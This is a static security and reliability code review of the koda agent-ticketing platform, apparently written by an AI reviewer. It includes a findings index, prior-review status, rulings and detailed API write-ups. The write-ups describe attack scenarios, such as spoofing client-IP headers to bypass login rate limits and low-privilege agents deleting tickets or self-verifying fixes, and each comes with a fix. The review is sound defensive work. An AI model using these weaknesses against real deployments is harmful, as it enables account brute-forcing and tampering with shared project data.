# Whole-Repo Code Review: koda

**Date:** 2026-10-18
**Reviewer:** Subrina (AI)
**Version:** 0.4.2, main `44269581`
**Scope:** `apps/api` (~63k LOC, excluding `src/generated`), `apps/web` (~34k), `apps/runner` (~13k), `apps/cli` (~7k), `packages/fleet-protocol`, CI/release workflows, Dockerfiles, compose files and `deployments/`.
**Prior review:** `docs/20260925-review-whole-repo.md` (HEAD `6f4420f8`). There have been 132 commits since then.
**Baseline:** Tests were not run. This is a static review.

**Method:**
- Five read-only reviewers, one per area:
  - **A:** API platform and the ticket domain.
  - **B:** API fleet control plane and the MCP endpoint.
  - **C:** API fleet operations and the code-intelligence modules (VCS, code-intel, RAG, memory, entity-graph).
  - **D:** Runner, `fleet-protocol` and the CLI.
  - **E:** Web app, CI and deployment files.
- Each finding was traced through its callers, guards and decorators.
- During consolidation, nine findings were checked by hand against the source, and all nine held:
  - E/BUG-1: `useAuth.fetchUser` and `me.get.ts` never call refresh.
  - C/SEC-1: `lance-table-manager.ts:446-449` deletes by `source_id` alone.
  - C/BUG-2: `QUEUED_SCAN_LIMIT = 50`.
  - C/BUG-4: `entity-graph.service.ts:55,73` reads keys the producer does not send (`tickets.service.ts:413`).
  - A/SEC-1: `main.ts:27-30` trusts all RFC1918 addresses as proxies.
  - A/SEC-3: `koda-casl-ability.factory.ts:116-117`. This is deliberate, per commit `4ceb85e`, but it contradicts the API docs. See the rulings section.
  - B/SEC-3: `sync.service.ts:136-140` only checks the WORKSPACE kind.
  - D/BUG-1: in `sync-loop.ts` `badBatch`, the event-blame path returns `again` with no delay.

Finding IDs below are prefixed with their area letter. For example, **C/SEC-1** is finding SEC-1 in area C. The full write-up for each finding (code excerpt, scenario, fix) is in the area section with that letter, further down this document.

---

## Overall Grade: B (75/100)

| Area | Security | Reliability | API Design | Code Quality | Best Practices | Total |
|:--|--:|--:|--:|--:|--:|--:|
| A: API platform + tickets | 15 | 15 | 15 | 15 | 14 | 74 |
| B: Fleet control plane + MCP | 16 | 16 | 17 | 17 | 17 | 83 |
| C: Fleet ops + intel | 14 | 13 | 15 | 15 | 12 | 69 |
| D: Runner + protocol + CLI | 16 | 15 | 16 | 15 | 16 | 78 |
| E: Web + CI + deploy | 14 | 12 | 15 | 16 | 13 | 70 |
| **Mean** | **15** | **14.2** | **15.6** | **15.6** | **14.4** | **74.8** |

The codebase is much healthier than at the 2026-09-25 review. All 13 prior HIGH findings are fixed (H4 only partially; its remainder is now A/SEC-2), and nearly all prior MEDIUM findings are fixed. The new fleet and runner code is the strongest part of the repo. It separates runner routes from agent routes, uses single-use enrollment, fences every runner write with a lease, locks and re-checks approvals, never stores git tokens, and keeps the protocol in a shared typed package.

There is one HIGH finding: a full page reload signs the user out 15 minutes after the last token refresh. The 40 MEDIUM findings fall into five groups:

1. **Authorization is wider than intended.** Agents and low-privilege members can overwrite shared state: knowledge-base rows (C/SEC-1), memory (C/SEC-2), ticket links (A/SEC-4), global agent state (A/SEC-2), and threads after demotion (B/SEC-2).
2. **Some write paths skip the domain's state machine.** The merged-PR auto-transition (C/BUG-6), CI-webhook tickets (A/BUG-4), the non-atomic status PATCH (A/BUG-2), and VCS import duplicates (C/BUG-3).
3. **The agent-first audit is fleet-only.** `approvalMode` and approver exist only on `PendingAction`. Most REST, knowledge-base, memory and VCS writes record no actor (A/ENH-1, C/ENH-1).
4. **Background and liveness edge cases.** Placement starvation (C/BUG-2), work continuing for soft-deleted projects (C/BUG-1), the sync hot-loop (D/BUG-1), RUNNING forever after pid reuse (D/BUG-2), approvals stuck in APPROVED (B/BUG-1), and live updates stopping for good after a short outage (E/BUG-3).
5. **Deployment defaults.** The API port is published and IP headers can be spoofed (A/SEC-1 with E/SEC-5), secrets default to `change-me`, the API image runs as root, Ollama is exposed without auth, 7-day access tokens, and release workflow permissions are too broad.

---

## Findings index

### HIGH (1)

| ID | Title | Location |
|:--|:--|:--|
| E/BUG-1 | A full page load more than 15 min after the last refresh sends the user to /login, although the 7-day refresh cookie is valid. The SSR auth probe never refreshes. | `apps/web/middleware/auth.global.ts:15-22`, `server/api/auth/me.get.ts`, `composables/useAuth.ts:79-101` |

### MEDIUM (40)

| ID | Title |
|:--|:--|
| A/SEC-1 | Rate limiting can be bypassed from any RFC1918 peer by spoofing `x-client-ip`, `cf-connecting-ip` or similar headers (`main.ts:27-30`). E/SEC-5 makes it reachable, because the API port is published. |
| A/SEC-2 | `PATCH /projects/:slug/agents/:agentSlug` changes the agent's global record; an agent can also edit itself. `maxConcurrentTickets` is not validated. |
| A/SEC-3 | Any rostered agent, even with no roles, can soft-delete any ticket and delete labels. Needs a ruling. |
| A/SEC-4 | Ticket links: any member (VIEWER, role-less agent) can delete fleet or VCS PR links, and nothing is recorded. |
| A/SEC-5 | No separation of duties: the agent that submitted a fix can verify it. Needs a ruling. |
| A/BUG-1 | `DELETE /agents/:slug` is a hard delete (documented as soft), and it nulls the author and assignee on every ticket and comment the agent touched. |
| A/BUG-2 | A ticket PATCH with both a status and other fields is not atomic: the fields commit, then the status change can fail with 400 or 409. |
| A/BUG-3 | Pickup always returns 403 for VERIFIER-only agents. When an admin triggers pickup, the audit row names the agent as the actor. |
| A/BUG-4 | Tickets created by the CI webhook skip the event and outbox pipeline: no notifications, live updates or memory extraction, and no actor. |
| A/ENH-1 | The agent-first audit is missing on REST writes: no `approvalMode` or approver, and many writes record no actor. |
| B/SEC-1 | MCP exposes jobs, spend, approvals and log excerpts to agents, while the REST routes refuse agents (R10: logs are for people). Needs a ruling. |
| B/SEC-2 | A project or REPO thread creator demoted to VIEWER keeps full control: send (paid jobs), publish (push), discard, and raising the cost cap. |
| B/SEC-3 | A PROJECT-thread job can get a write token for the project's anchor repo (`sync.service.ts:136-140` only refuses WORKSPACE threads). |
| B/MEM-1 | Bundle ingest caps each file's size but not the file count or total decompressed size, so the API can run out of memory. The failed ingest is retried after restart. |
| B/BUG-1 | An approved assistant action can stay APPROVED forever if the process dies or the second transaction fails between approve and recording the outcome. |
| C/SEC-1 | `POST /kb/documents` replaces by `source_id` alone, so any rostered agent or DEVELOPER can delete ticket summaries, repo chunks, run outcomes or graph nodes. |
| C/SEC-2 | Any member, VIEWER included, can write memory and replace facts another principal owns. `/memory/extract` accepts any `ticketId`. |
| C/BUG-1 | Soft-deleting a project does not stop its queued jobs, budget sweeps (which lift its pauses) or VCS polling. |
| C/BUG-2 | `fillRunner` only scans the 50 oldest queued jobs, so jobs that can never be placed starve every newer job. |
| C/BUG-3 | VCS issue import checks and then inserts, with no unique `(projectId, externalVcsId)` key, so overlapping syncs create duplicate tickets. |
| C/BUG-4 | The entity-graph `assigned` handler reads `assignedToUserId`/`assignedToAgentId`, which the producer never sends, so owner links are never created. The test uses the wrong shape. |
| C/BUG-5 | LanceDB `optimize()` runs outside the per-table write lock. |
| C/BUG-6 | The merged-PR auto-transition bypasses the ticket state machine. It uses a stale status check, can reopen closed or deleted tickets, emits no event and records no actor, and is never retried. |
| C/ENH-1 | The agent-first audit is missing in knowledge base, memory, skills, VCS and code-intel writes. Scheduled dispatches and failure comments name the wrong actor. |
| D/BUG-1 | A persistent 400 makes the runner sync loop retry with no delay, and the event-blame path overwrites a real pending event with "dropped". |
| D/SEC-1 | The runner's own git calls in the shared clone still honor repo hooks and config. Other git paths are already hardened. |
| D/SEC-2 | Per-job credential sockets are protected only by the OS user, so an unsandboxed job can request other jobs' push tokens. Design-level. |
| D/BUG-2 | After a daemon restart, liveness is only `kill(pid,0)`. A reused pid or an EPERM result keeps the job RUNNING forever and the repo lock held. |
| D/OPS-1 | The launchd plist restarts every 10 s even when the server has refused the runner's key, and `runner.log` is never rotated. |
| E/SEC-1 | Logout skips the server-side revoke when the access cookie has expired, and ignores upstream errors. |
| E/BUG-2 | `SameSite=Strict` with no return path: every link from email, GitHub or chat lands on `/`. |
| E/BUG-3 | A short API outage stops live updates in every open tab for good and clears the signed-in user in the UI. |
| E/SEC-2 | The invite token goes into API paths unencoded, so a crafted invite link can redirect the form submit to another API path. |
| E/SEC-3 | The example production compose defaults the JWT and API-key secrets to `change-me`. |
| E/SEC-4 | The API production image runs as root. |
| E/SEC-5 | Both compose files publish the API port, which lets clients bypass the web proxy (pairs with A/SEC-1). |
| E/SEC-6 | The `rag` profile publishes Ollama without auth on `0.0.0.0:11434`, on the `latest` tag. |
| E/SEC-7 | Compose overrides token lifetimes to 7 days for access and 30 days for refresh (API defaults: 15 min and 7 days). |
| E/SEC-8 | The release workflow gives write and OIDC permissions to every job; third-party actions are not pinned to SHAs. |
| E/BUG-4 | A manual re-publish (`workflow_dispatch`) builds `main` and overwrites the published version's image tags. |

Ten of these are deployment, CI or ops items (D/OPS-1, E/SEC-3 to E/SEC-8, E/BUG-4). The reviewers graded them MEDIUM, but for a single-host private install they are lower-impact than the code findings.

### LOW (60)

There are 60 LOW findings: 17 in A, 5 in B, 13 in C, 13 in D and 12 in E. They are listed in the area sections. The notable ones:
- A: changes to an agent's roles take up to 60 s to apply because the cache key doesn't match; refresh tokens are not rotated; no shutdown hooks; unique-index races return 500 instead of 409.
- C: the VCS webhook secret is stored in plaintext; the `allowedAuthors` filter fails open; the `EntityStore` map is unbounded.
- D: an unhandled rejection in the prune timer; `file:` clone URLs are accepted; `thread-job-run.ts` is 1045 lines.

---

## Prior review (2026-09-25) status

| Finding | Status | Evidence |
|:--|:--|:--|
| H1 refresh ignores revocation | Fixed | `auth.service.ts:104-106` |
| H2 no global throttler guard | Fixed; residual A/SEC-1 | `app.module.ts:143` |
| H3 `ciWebhookToken` in project DTO | Fixed | `project-response.dto.ts:91-108` |
| H4 agent PATCH missing permission | Partial; residual A/SEC-2 | `projects.controller.ts:254-263` |
| H5 ticket lookup crosses projects | Fixed | `prisma-tickets.repository.ts:289-330` |
| H6 `authorAgentId: 'system'` | Fixed | area C |
| H7 RAG double-index | Fixed | area C |
| H8 cookie names | Fixed | area E |
| H9 SSR fetch drops cookies | Fixed | `useAuth.ts:88-90` (`useRequestFetch`) |
| H10 CLI project config can override the API URL and key | Fixed | `apps/cli/src/config.ts:144-170,227-232` |
| H11 CLI handoff | Fixed | (fixed at 09-25) |
| H12 memory `ownerId` spoofing | Core fixed; residual C/SEC-2 | area C |
| H13 outbox envelope | Fixed | `outbox-envelope.util.ts` |
| M1-M28 | All fixed except: M8 partial (duplicate DTOs, `agents.service.ts:22-35`) and M22 partial (now E/BUG-1) | area tables |
| Deferred: uppercase `TICKET_*` actions match no extraction rule | **Still open** | area C |
| Deferred: `source_id`-only replace scope | **Still open**, and exploitable (C/SEC-1) | `lance-table-manager.ts:446-449` |
| CI: `TURBO_TOKEN` passed as a build-arg; release not gated on CI | **Still open** | area E |

---

## Rulings needed (decisions for you, not defects)

**Ruled 2026-10-18:**
- **Ruling 5 accepted.** Short term: a per-job nonce on the credential socket, and no unsandboxed or raw job running at the same time as another project's job on one runner. Document that one runner is one trust domain. Later: per-job OS user or VM.
- **Rulings 1-4 are deferred to a redesign.** MCP vs R10, agent ticket and label delete, self-verify, and audit scope will be folded into one redesign of permissions, approval, actor and approver across the whole API. They will not be fixed one at a time. The original questions are kept below for reference. The redesign is `docs/superpowers/specs/2026-10-18-permission-approval-redesign-design.md` (direction approved 2026-10-18).

1. **B/SEC-1: agent access to fleet data through MCP.** REST denies agents access to logs and spend (R10). Either MCP adopts R10, or R10 is relaxed for MCP and documented.
2. **A/SEC-3: agents can soft-delete tickets.** This is deliberate (commit `4ceb85e`), but the OpenAPI docs say ticket delete is admin-only. Change either the docs or the permission.
3. **A/SEC-5: separation of duties on verify-fix.** Should the agent that submitted a fix be allowed to verify it?
4. **A/ENH-1 and C/ENH-1: scope of the agent-first audit.** `approvalMode` and approver exist only on fleet `PendingAction`. Decide whether every write records an actor (cheap), and whether `approvalMode` applies outside fleet (larger; overlaps koda #301).
5. **D/SEC-2: credential isolation between jobs on one runner.** Isolation between jobs that share an OS user is design-level. Accept and document it, or move to a per-job credential or socket capability.

---

## Priority Fix Order

| Priority | ID | Effort | Description |
|:--|:--|:--|:--|
| P0 | E/BUG-1 | S | Make the SSR auth probe (`me.get.ts` or the middleware) try `/auth/refresh` when the access cookie is missing or expired, then retry. |
| P0 | C/SEC-1 | S | Scope the knowledge-base replace to `(source_id, source)`, and reject reserved sources on `POST /kb/documents`. |
| P0 | C/SEC-2 | S | Check ownership on memory replace; require at least DEVELOPER to write; verify the `ticketId` belongs to the project. |
| P0 | A/SEC-1 + E/SEC-5 | S | Trust only the actual proxy address (nginx or Nuxt), and stop publishing the API port in compose. |
| P0 | C/BUG-2 | M | Placement: skip jobs that can never be placed, or scan per runner capability, instead of a global oldest-50 window. |
| P0 | C/BUG-6 | M | Send the merged-PR transition through `TicketTransitionsService` (compare-and-set status, event, actor, retry). |
| P1 | B/SEC-3 | S | Refuse a repo-less token request for PROJECT threads as well. |
| P1 | B/SEC-2 | S | Re-check membership role on every thread write, as workspace threads already do. |
| P1 | B/MEM-1 | S | Cap the file count and total decompressed size during bundle ingest; mark a failed ingest terminal. |
| P1 | B/BUG-1 | M | Record the outcome of an approved action in the same transaction, or add a sweeper for stale APPROVED rows. |
| P1 | D/BUG-1 | S | Back off on the event-blame path; only blame an event when the batch holds exactly one event. |
| P1 | D/BUG-2 | S | Check process identity (start time or command) before treating a re-adopted pid as alive. |
| P1 | D/SEC-1 | S | Apply the existing hardened git config (`core.hooksPath=/dev/null` and similar) to the executor's git calls. |
| P1 | C/BUG-1 | M | Soft-deleting a project cancels its queued jobs and stops budget sweeps and VCS polling for it. |
| P1 | C/BUG-3 | S | Add a unique `(projectId, externalVcsId)` index and upsert. |
| P1 | C/BUG-4 | S | Fix the field names the entity-graph handler reads, and fix the test fixture shape. |
| P1 | A/BUG-2, A/BUG-4 | M | Run the PATCH status change in one transaction; send CI-webhook tickets through `TicketsService`. |
| P1 | A/SEC-2, A/SEC-4, A/BUG-1, A/BUG-3 | M | Agent PATCH scope and validation; role checks on link deletes; make agent delete soft; add VERIFIER to pickup. |
| P2 | E/SEC-1, E/BUG-2, E/BUG-3, E/SEC-2 | M | Web session handling: revoke on logout using the refresh token, keep a return path after login, treat outages as reconnects, encode the invite token. |
| P2 | E/SEC-3, SEC-4, SEC-6, SEC-7, SEC-8, BUG-4 | M | Deploy and CI hardening. |
| P2 | C/BUG-5, D/OPS-1 | S | Run `optimize` under the write lock; launchd `KeepAlive` on failure only, plus log rotation. |
| P3 | rulings 1-5 | - | Rulings first, then implement. |
| P3 | LOW items | - | Fold them into the fix PRs they touch. |

---

# Area reports


---

## Review A: API platform + ticket domain (koda main @ 44269581)

Scope: `apps/api/src/{main.ts, app.module.ts, auth, users, agents, projects, policy, common, config, webhook-security, webhook, ci-webhook, notifications, email, home, labels, comments, live, health, monitoring, tickets, ticket-links, outbox, events, koda-domain-writer}` + `prisma/schema.prisma`.
Method: read-only. Checklists `universal.md` + `nestjs-app.md`. Every finding traced through route decorators -> global guards (CombinedAuthGuard, PermissionAuthGuard, DefaultThrottlerGuard) -> ProjectMembershipGuard -> service -> repository. Installed package behavior read from `apps/api/node_modules/@nathapp/*` dist (nestjs-auth permission guard/provider, nestjs-cache tag invalidation, nestjs-common getClientIp, nestjs-app pipes/shutdown).

### Summary

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 9 |
| LOW | 17 |

No CRITICAL/HIGH. All 13 prior HIGHs that touch this area (H1-H5, H13 producer side) are fixed at HEAD. The remaining issues cluster around (a) agent-first audit gaps (no approvalMode/approver anywhere outside fleet PendingAction; several writes record no actor at all), (b) agent/role least-privilege, and (c) a handful of non-atomic or race-prone writes.

---

### MEDIUM

#### SEC-1 [MEDIUM] Rate limiting bypassable from any RFC1918 peer via spoofed client-IP headers
- **Where:** `apps/api/src/main.ts:27-30`; library `node_modules/@nathapp/nestjs-common/dist/ip/request-ip.js:248-290`
```ts
app.configureTrustProxy({ enabled: true,
  trustedProxies: ['127.0.0.1', '::1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'] });
```
- **Trace:** For a trusted peer, `getClientIpByHeader` returns `x-client-ip`, `cf-connecting-ip`, `true-client-ip`, `fastly-client-ip`, `x-real-ip`, ... *unfiltered* (only `x-forwarded-for` is walked against the trust list). The web proxy deliberately sets `x-client-ip` (`apps/web/server/utils/client-ip.ts:5-8`), but every other client whose TCP peer is in 10/8, 172.16/12 or 192.168/16 is treated as a proxy too: LAN users of a home deployment, sibling containers, a cloudflared/nginx sidecar that forwards client headers, Docker userland-proxy (peer = bridge gateway 172.17.0.1).
- **Scenario:** Attacker reaching the API through any such path sends `POST /api/auth/login` with a random `x-client-ip` per request. Each request lands in a fresh throttler bucket, so the 5/min login/register/invite-accept limit (`auth-throttle.ts`) and the 100/min global limit never trigger -> unlimited password brute force / invite-token guessing.
- **Fix:** Trust only the exact proxy address(es) (the Nuxt container IP / a configured `TRUSTED_PROXIES` env), not whole private ranges; and/or configure the throttler tracker to read only `x-client-ip` from that proxy and ignore the other vendor headers. Add an e2e test: two logins from a non-proxy peer with different `x-client-ip` share one bucket.

#### SEC-2 [MEDIUM] Project-scoped route mutates global agent state; agents can self-unpause / self-edit
- **Where:** `projects/projects.controller.ts:254-265` -> `agents/agents.service.ts:290-302`; DTO `agents/dto/update-agent.dto.ts:10-18`
```ts
const isAdmin = isUserPrincipal(principal) && (principal.role === 'ADMIN' ||
  (await this.projectsService.findMembershipRole(project.id, principal.id)) === ActorRole.ADMIN);
const isSelf = isAgentPrincipal(principal) && principal.slug === agentSlug;
...
const data = await this.agentsService.update(agentSlug, updateDto); // global Agent row
```
- **Scenario 1:** A *project* ADMIN of project A (not a global admin) PATCHes `/projects/A/agents/bot` `{status:'OFFLINE'}`. The Agent row is global: the agent is now refused by `CombinedAuthGuard` (`combined-auth.guard.ts:96`) in every project, and only a global admin can restore it. Same for renaming it or setting `maxConcurrentTickets`.
- **Scenario 2:** A global admin PAUSEs an agent; the agent PATCHes itself `{status:'ACTIVE', maxConcurrentTickets: 1000}`. The H4 comment says self-updates are for "graceful OFFLINE shutdown" but nothing restricts the body.
- Also: `maxConcurrentTickets` is `@IsNumber()` only -> `1.5` reaches a Prisma `Int` column (500), negatives accepted.
- **Fix:** On this route, allow project admins nothing global (or move status to a per-project roster field); allow `isSelf` only `{status:'OFFLINE'}`; add `@IsInt() @Min(1) @Max(n)` to `maxConcurrentTickets`. Record the actor (see ENH-1).

#### SEC-3 [MEDIUM] Every rostered agent, with zero roles, can soft-delete any ticket and delete project labels
- **Where:** `auth/casl/koda-casl-ability.factory.ts:116-119`; routes `tickets/tickets.controller.ts:226-231`, `labels/labels.controller.ts:131-145`
```ts
{ action: CaslPermissionAction.MANAGE, subject: 'Label' },
{ action: CaslPermissionAction.CREATE, subject: 'Ticket' },
// Preserve pre-CASL behavior (commit 4ceb85e: "allow agents to soft-delete tickets")
{ action: CaslPermissionAction.DELETE, subject: 'Ticket' },
```
- **Trace:** `@ProjectPermission([DELETE,'Ticket'])` (no `exemptAgents`) -> `ProjectMembershipGuard.assertProjectPermission` -> agent ability (role-independent grants). The route's own Swagger says "Soft delete a ticket (admin only)" and users need project ADMIN for it.
- **Scenario:** An agent added to a project with no `AgentRoleEntry` (read-only intent) deletes tickets (the `TICKET_DELETED` event then also purges the KB doc) and deletes labels (cascading `TicketLabel` removal). With agent-first operation, a misbehaving/prompt-injected agent can wipe a project's backlog.
- **Fix:** Derive DELETE Ticket / MANAGE Label from a role (e.g. TRIAGER) instead of granting them to every agent; at minimum gate DELETE Ticket behind a role and record approval (ENH-1).

#### SEC-4 [MEDIUM] Ticket links: any member (incl. VIEWER, role-less agent) can create/delete links, including fleet/VCS PR links; no audit
- **Where:** `ticket-links/ticket-links.controller.ts:38-42,82-96`; `ticket-links.service.ts:116-126`
```ts
private async assertMembership(slug, principal) { ...assertProjectMembership(projectId, principal) }
@Delete(':linkId') async remove(...) { await this.assertMembership(slug, principal); await this.ticketLinksService.remove(slug, ref, linkId); }
```
- **Trace:** No `@ProjectPermission`; membership only (VIEWER and any rostered agent pass). `remove` hard-deletes any link on the ticket, including `source=FLEET`/`linkType='pr'` rows that `PrismaTicketsRepository.hasFleetOwnership` (`prisma-tickets.repository.ts:393-403`) and VCS PR sync depend on. `linkType` is a free string (`dto/create-ticket-link.dto.ts:9-12`). No actor, activity, or event is written for create/delete.
- **Scenario:** A VIEWER deletes the fleet PR link of a ticket; the next VERIFIED transition no longer sees fleet ownership and opens a duplicate classic draft PR; PR-state sync loses the link. Nobody can tell who did it.
- **Fix:** Require `UPDATE Ticket` (`@UseGuards(ProjectMembershipGuard) @ProjectPermission([UPDATE,'Ticket'])`), refuse deleting `source !== MANUAL` links except for admins, `@IsIn` the link types, and write a TicketActivity/TicketEvent with the actor.

#### BUG-1 [MEDIUM] `DELETE /agents/:slug` is a hard delete that nulls authorship of every ticket and comment the agent wrote
- **Where:** `agents/agents.controller.ts:159-170` (documented "Delete (soft-delete) an agent"); `agents/prisma-agent.repository.ts:80-82`; FKs `prisma/migrations/...:593,599,608`
```ts
async deleteBySlug(slug: string) { return this.db.agent.delete({ where: { slug } }); }
-- "Comment_authorAgentId_fkey" ... ON DELETE SET NULL
-- "Ticket_createdByAgentId_fkey" / "Ticket_assignedToAgentId_fkey" ... ON DELETE SET NULL
```
- **Scenario:** Admin decommissions an agent by deleting it. Every comment it authored becomes authorless, every ticket it created loses `createdByAgentId`, and its assignments silently vanish (tickets look unassigned, no `assigned` event). Directly contradicts the agent-first actor-attribution requirement and the API docs.
- **Fix:** Make delete a soft delete (`deletedAt` or status `OFFLINE` + key hash rotation to a random value), or refuse delete while the agent has authored rows; never cascade attribution away.

#### BUG-2 [MEDIUM] PATCH ticket `{status, ...fields}` is non-atomic: fields commit, then the transition can fail
- **Where:** `tickets/tickets.service.ts:236-249`
```ts
if (Object.keys(rest).length > 0) {
  await this.applyUpdate(projectSlug, ref, rest as UpdateTicketDto, principal); // own txManager.run, commits
}
const result = await this.transitionsService.executeTransitionPublic(projectSlug, ref, status, principal); // may throw 400/409
```
- **Scenario:** `PATCH /projects/p/tickets/P-7 {"title":"x","status":"CLOSED"}` on an IN_PROGRESS ticket. Title is updated and a `TICKET_UPDATED` event + outbox row is committed, then `validateTransition` throws 400 (CLOSED needs a REVIEW comment; PATCH supplies none). Client sees an error but the write happened (also on a concurrent-transition 409).
- **Fix:** Validate the transition (`validateTransition(current.status, status, undefined)`) before applying fields, and run both inside one outer `txManager.run` (the transition's inner `run` joins the ambient tx).

#### BUG-3 [MEDIUM] Pickup is broken for VERIFIER-only agents; and pickup audit is misattributed
- **Where:** `koda-domain-writer/koda-domain-writer.service.ts:58-70,116-128`; caller `agents/agents.service.ts:63-78,405-410`
```ts
const allowedRoles = ['ADMIN', 'DEVELOPER', 'REVIEWER', 'TRIAGER', 'AGENT']; // no 'VERIFIER'
const hasRole = actor.projectRoles.some((role) => allowedRoles.includes(role));
if (!hasRole) throw new ForbiddenAppException({}, 'koda-domain-writer');
```
- **Trace:** `AGENT_ROLES = DEVELOPER|REVIEWER|VERIFIER|TRIAGER` (`common/enums.ts:67`). `GET /agents/:slug/pickup` -> `suggestTicket` -> `recordAgentAction` -> `writeAgentAction` -> `assertActorHasEventRole`. A role-less agent passes (`length === 0 && agent -> return`), a VERIFIER-only agent throws.
- **Scenario 1:** A VERIFIER agent runs `koda agent pickup`; after the suggestion is computed the request fails with 403 every time.
- **Scenario 2:** A global ADMIN calls pickup for agent X; the AgentEvent is written with `actorId: agentId` (`agents.service.ts:74`), so the audit says the agent acted. A GET also writes an AgentEvent + outbox row (side effects on a safe method).
- **Fix:** Use `AGENT_ROLES` (or drop the role gate for agents: they are already roster-scoped); pass the real principal as `actorId`; consider POST for pickup.

#### BUG-4 [MEDIUM] CI-webhook tickets bypass the ticket event pipeline and record no actor
- **Where:** `ci-webhook/ci-webhook.service.ts:61-82`; `ci-webhook/prisma-ci-webhook.repository.ts:27-50`
```ts
return this.prisma.client.ticket.create({ data: { projectId, number: nextNumber, ...data } }); // no TicketEvent, no outbox
```
- **Scenario:** CI posts `pipeline_failed`; a HIGH BUG ticket appears but: no `TICKET_CREATED` TicketEvent/outbox row -> no live SSE update, no watcher/notification fan-out, no memory/entity-graph extraction, no RAG lifecycle; `createdByUserId/AgentId` are null and nothing records that the "webhook" source created it. The ticket is invisible to the home activity feed.
- **Fix:** Create the ticket through `TicketsService`-style logic in the same tx: write a TicketEvent with `actorType: 'system'`/`source: 'webhook'` (schema needs a system actor kind) and the `ticket_event` outbox row.

#### ENH-1 [MEDIUM] Agent-first audit requirement not met on REST write paths (no approvalMode/approver; several writes record no actor)
- **Where:** `prisma/schema.prisma:497-513` (`TicketEvent` has `actorId/actorType/source` only); `approvalMode/approverType/approverId` exist only on `PendingAction` (`schema.prisma:1138-1140`, fleet).
- **Writes with actor but no approvalMode/approver:** ticket create/update/delete/assign/transitions (`tickets.service.ts:58-81`, `ticket-transitions.service.ts:90-140`), comment create, label assign/remove (TicketActivity only).
- **Writes with no actor/audit at all:**
  - agent create / rotate-key / roles / capabilities / update / delete: `recordAgentAction` is a no-op without `projectId` (`agents.service.ts:69`), and the admin's id is never passed;
  - user admin create/role/disable (`users/users-admin.service.ts:29-80`);
  - project create/update (incl. `ciWebhookToken` rotation)/soft-delete (`projects/projects.service.ts`);
  - project member add/role/remove (`members/project-members.service.ts:44-79`), invites create/resend/cancel;
  - outbound webhook create/update/delete (`webhook/webhook.service.ts`);
  - label create/update/delete (`labels/labels.service.ts:17-92`);
  - ticket link create/delete (SEC-4); comment edit/delete (`comments/comments.service.ts:194,219` - hard delete, no history, so an agent can rewrite its FIX_REPORT after approval);
  - CI tickets (BUG-4).
- **Fix:** Add `approvalMode` (`none|self|agent|human`) + `approverType/approverId` to TicketEvent/AgentEvent (or a generic `AuditEvent`), populate from the request principal (REST default `approvalMode: 'none'`, approver null; MCP/PendingAction path supplies its decision), and emit an audit row for every admin/config write above. Ruling `feedback-koda-agent-first-actor-approver-audit` applies.

#### SEC-5 [MEDIUM] No separation of duties: the agent that submitted a fix can approve it
- **Where:** `tickets/state-machine/ticket-transitions.service.ts:382-403` (`verifyFix`), `:315-331` (`verify` on VERIFY_FIX also closes); grants `koda-casl-ability.factory.ts:132-145`
- **Trace:** DEVELOPER, REVIEWER and VERIFIER all map to the same `TRANSITION Ticket` permission; no check compares the approver with the actor of the IN_PROGRESS->VERIFY_FIX transition.
- **Scenario:** A DEVELOPER agent calls `/fix` then `/verify-fix?approve=true` (or `/verify`) on its own ticket: CLOSED with a self-written REVIEW comment; nothing records that approval was self-approval.
- **Fix:** Split TRANSITION into per-edge permissions (VERIFIER/REVIEWER for verify-fix approve) and/or refuse approve when the approver equals the last FIX_REPORT author unless the principal is a human admin; record `approvalMode: 'self'` when allowed.

---

### LOW

| ID | Where | Defect -> failure | Fix |
|---|---|---|---|
| BUG-5 | `agents/agents.service.ts:304-324`, `prisma-agent.repository.ts:103-119` | `updateRoles`/`updateCapabilities` do `deleteMany` then `createMany` with no `txManager.run`; a failed insert leaves a working key with zero roles (prior LOW, still open for replace). | Wrap in `txManager.run`. |
| SEC-6 | `auth/agent-auth.provider.ts:16,41,55-57`; `agents.service.ts:300,311,322` | Principal cached under `['agent-principal', id, status]`; invalidation calls `invalidate('AGENT:<id>', {mode:'tag'})`. MEMORY strategy has no tag registry (`cache.provider.js:12-22`), so it degrades to prefix-delete `AGENT:<ID>` which never matches `AGENT-PRINCIPAL:...`. Role revocations stay effective up to 60 s. (Key rotation/OFFLINE/delete are immediate since the hash lookup is uncached.) | Invalidate the concrete keys (`['agent-principal', id, s]` for each status), as `auth.service.ts:141` already does for users. |
| SEC-7 | `auth/auth.service.ts:101-115` | Refresh tokens are not rotated/one-time: the same refresh token mints new pairs for 7 d until a logout bumps `tokenVersion`; theft is undetectable. | Store a per-token jti/family and reject reuse. |
| SEC-8 | `comments/dto/create-comment.dto.ts:24-28` | Any member (incl. VIEWER) can post `VERIFICATION`/`FIX_REPORT`/`REVIEW`/`STATUS_CHANGE`-typed comments outside a transition; they render and index into RAG (`[REVIEW] ...`) as workflow records. | Allow only `GENERAL` on the comment route; workflow types only from transitions. |
| SEC-9 | `agents/agents.controller.ts:80-105` | `GET /agents`, `GET /agents/:slug` carry no permission: any principal (VIEWER, roster-scoped agent) lists every agent, roles, capabilities and status across projects, undermining S4c scoping. | Admin-only list, or filter to agents sharing a project with the caller. |
| SEC-10 | `config/env.validation.ts:12-16` | No minimum length for `JWT_SECRET`, `JWT_REFRESH_SECRET`, `API_KEY_SECRET` (HMAC key for all agent keys). | `.min(32)`. |
| SEC-11 | `common/utils/encryption.util.ts:57-60` | GCM `setAuthTag` without `authTagLength`, so truncated tags (4+ bytes) are accepted. Data is server-side, so low impact. | `createDecipheriv(..., { authTagLength: 16 })` and check tag length. |
| BUG-6 | `labels/labels.service.ts:119-129`; `ticket-links.service.ts:75-89`; `projects/projects.service.ts:45-67` | Check-then-insert against unique indexes (`TicketLabel` PK, `TicketLink(ticketId,url)`, `Project.slug/key`) with no P2002 mapping -> concurrent requests get 500. | Catch `isUniqueViolation` -> 409/200. |
| BUG-7 | `auth/guards/combined-auth.guard.ts:55-58` | API-key DB errors are swallowed and the request falls through to JWT, so a DB outage returns 401 to every agent (misleading; agents may treat it as revoked credentials). | Re-throw non-"not found" errors as 503. |
| PERF-1 | `tickets/state-machine/ticket-transitions.service.ts:633-635` | `createPrForTicket` (documented fire-and-forget) is awaited inside `/verify`: GitHub `getDefaultBranch` + `createPullRequest` + link extraction run on the request path. | Fire-and-forget with `.catch`, or enqueue an outbox job. |
